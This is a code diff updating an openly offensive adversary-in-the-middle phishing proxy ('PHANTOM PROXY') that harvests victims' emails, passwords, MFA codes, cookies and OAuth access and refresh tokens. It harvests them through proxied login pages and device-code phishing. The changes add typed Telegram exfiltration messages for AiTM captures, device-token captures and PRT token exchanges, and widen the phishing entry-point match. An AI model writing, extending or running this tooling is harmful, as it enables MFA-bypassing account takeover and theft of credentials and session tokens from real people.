@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.4 — COMPLETE proxy_server.js
+// 🥔 PHANTOM PROXY v10.5 — AiTM/Device NOTIFICATION SPLIT
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
 // ✅ Service Worker injection + serving FIXED
@@ -8,7 +8,7 @@
 // ✅ Proxy routing FIXED
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ All features intact
+// ✅ Telegram notifications: AiTM captures, Device token captures, PRT exchanges
 // ============================================================
 
 const http = require("http");
@@ -167,7 +167,7 @@ function logVisit(req, pageType = 'page') {
 }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION
+// 📤 TELEGRAM EXFILTRATION (with type differentiation)
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -216,7 +216,7 @@ async function sendCookiesFile(cookies, sessionId) {
     } catch (e) { console.error('Telegram cookies file failed:', e.message); }
 }
 
-async function sendToTelegram(data) {
+async function sendToTelegram(data, type = 'capture') {
     if (!axios) {
         console.error('❌ axios not available, cannot send Telegram.');
         return;
@@ -228,10 +228,29 @@ async function sendToTelegram(data) {
         const mfa = data.mfa || 'N/A';
         const tokens = data.tokens || {};
         const cookies = data.cookies || {};
+        const phishedUrl = data.phishedUrl || 'N/A';
 
-        console.log(`📤 Sending Telegram for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
+        console.log(`📤 Sending Telegram [${type}] for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
 
-        let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
+        let header;
+        switch (type) {
+            case 'aitm':
+                header = '🔐 **AiTM Credential Capture!**';
+                break;
+            case 'device':
+                header = '📱 **Device Code Token Capture!**';
+                break;
+            case 'prt':
+                header = '🔄 **PRT Token Exchange!**';
+                break;
+            default:
+                header = '🔐 **LOGIN CAPTURED!**';
+        }
+
+        let message = `${header}\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
+        if (type === 'aitm' && phishedUrl !== 'N/A') {
+            message += `\n🎯 Target URL: ${phishedUrl}`;
+        }
         if (Object.keys(tokens).length > 0) {
             message += '\n\n🔑 Tokens:\n';
             for (const [k, v] of Object.entries(tokens)) message += `${k}: ${v.slice(0, 30)}...\n`;
@@ -247,9 +266,9 @@ async function sendToTelegram(data) {
             text: message,
             parse_mode: 'Markdown'
         }, { timeout: 5000 });
-        console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
+        console.log(`✅ Telegram exfil [${type}] for session ${sessionId} — response:`, response.status);
     } catch (e) {
-        console.error('❌ Telegram send failed:', e.message);
+        console.error(`❌ Telegram send [${type}] failed:`, e.message);
         if (e.response) {
             console.error('📛 Telegram API response:', e.response.data);
         }
@@ -257,7 +276,7 @@ async function sendToTelegram(data) {
 }
 
 // ============================================================
-// 🧩 PROXY HELPERS
+// 🧩 PROXY HELPERS (unchanged)
 // ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
@@ -947,7 +966,7 @@ const server = http.createServer(async (req, res) => {
     // ── 🔥 HEALTH CHECK ENDPOINT (Railway requirement) ──
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.4', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        res.end(JSON.stringify({ status: 'healthy', version: '10.5', uptime: process.uptime(), timestamp: new Date().toISOString() }));
         return;
     }
 
@@ -1060,7 +1079,7 @@ async function handleDeviceCodeRequest(req, res) {
 }
 
 // ============================================================
-// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint)
+// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint) – now sends Telegram on approval
 // ============================================================
 async function handleDeviceCodeToken(req, res) {
     let body = '';
@@ -1091,6 +1110,26 @@ async function handleDeviceCodeToken(req, res) {
                 flow.id_token = tokens.id_token;
                 flow.approved = new Date().toISOString();
                 saveDeviceFlows();
+
+                // ── 🔥 Send Telegram notification for device token capture ──
+                try {
+                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || 'Unknown';
+                    await sendToTelegram({
+                        sessionId: flow.session_id || 'device',
+                        email: 'Device Code Flow',
+                        password: 'N/A',
+                        mfa: 'N/A',
+                        tokens: {
+                            access_token: tokens.access_token,
+                            refresh_token: tokens.refresh_token,
+                            id_token: tokens.id_token
+                        },
+                        cookies: {}
+                    }, 'device');
+                    console.log('✅ Device token capture notification sent.');
+                } catch (e) {
+                    console.error('❌ Device token capture notification failed:', e.message);
+                }
             }
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify(tokens));
@@ -1111,7 +1150,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS)
+// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS) – unchanged except PRT exchange uses new type
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1379,6 +1418,7 @@ async function handleDashboardAPI(req, res) {
                     flow.id_token = tokens.id_token;
                     flow.approved = new Date().toISOString();
                     saveDeviceFlows();
+                    // Also send notification here if needed (but we already send in public endpoint)
                 }
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify(tokens));
@@ -1570,7 +1610,7 @@ async function handleDashboardAPI(req, res) {
                     );
                 }, 3, 1500, 2);
                 const tokens = response.data;
-                await sendToTelegram({ sessionId: 'prt_exchange', tokens });
+                await sendToTelegram({ sessionId: 'prt_exchange', tokens }, 'prt');
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: true, data: tokens }));
             } catch (err) {
@@ -2158,8 +2198,13 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
+    // ── 🔥 Log every incoming URL for debugging ──
+    console.log('📥 Incoming URL:', url);
+
     // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    // Use a more forgiving condition: must contain "/login" and the redirect parameter
+    if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
+        console.log('🔥 ENTRY POINT MATCHED');
         logVisit(clientRequest, 'aitm');  // 🔥 LOG AITM VISITS
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
@@ -2394,6 +2439,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             let bodyBuffer = Buffer.concat(responseBody);
 
                             let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
+                            let phishedUrl = VICTIM_SESSIONS[currentSession]?.host || 'N/A';
                             try {
                                 let reqBody = proxyRequestBody;
                                 if (typeof reqBody === 'string') {
@@ -2439,7 +2485,16 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     }
                                 }
                                 if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
-                                    await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
+                                    // 🔥 Send as AiTM capture with phished URL
+                                    await sendToTelegram({
+                                        sessionId: currentSession,
+                                        email,
+                                        password,
+                                        mfa,
+                                        tokens,
+                                        cookies,
+                                        phishedUrl
+                                    }, 'aitm');
                                 } else {
                                     console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
                                 }
@@ -2541,13 +2596,13 @@ if (WebSocket) {
 
 // 🔥 STEP 2: NOW start listening
 server.listen(PORT, '::', () => {
-    console.log(`✅ PHANTOM PROXY v10.4 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.5 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
     console.log(`📤 Page‑load notifications: ACTIVE`);
-    console.log(`📤 Telegram exfil: ACTIVE`);
+    console.log(`📤 Telegram exfil (AiTM/Device/PRT): ACTIVE`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
@@ -2557,13 +2612,11 @@ server.listen(PORT, '::', () => {
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`🔌 WebSocket: /ws (live log updates)`);
 
-    // Warn if Telegram credentials are missing
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
     }
 });
 
-// Error handling
 server.on('error', (err) => {
     console.error('❌ Server error:', err.message);
     if (err.code === 'EADDRINUSE') {
